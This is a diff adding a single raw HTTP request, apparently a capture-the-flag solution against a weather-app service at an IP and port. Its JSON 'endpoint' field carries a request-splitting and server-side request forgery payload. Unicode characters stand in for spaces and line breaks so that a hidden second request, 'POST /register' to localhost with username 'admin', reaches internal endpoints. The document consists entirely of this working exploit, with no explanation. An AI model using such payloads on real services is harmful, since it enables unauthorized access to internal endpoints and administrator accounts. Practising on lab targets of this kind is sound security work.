@@ -1,0 +1,9 @@
+POST /api/weather HTTP/1.1
+Host: 138.68.189.41:32481
+Connection: keep-alive
+Content-Type: application/json
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{"endpoint":"127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ27čĊčĊusername=admin&password=*čĊčĊGETĠ/?qwe=","city":"qwe","country":"qwe"}
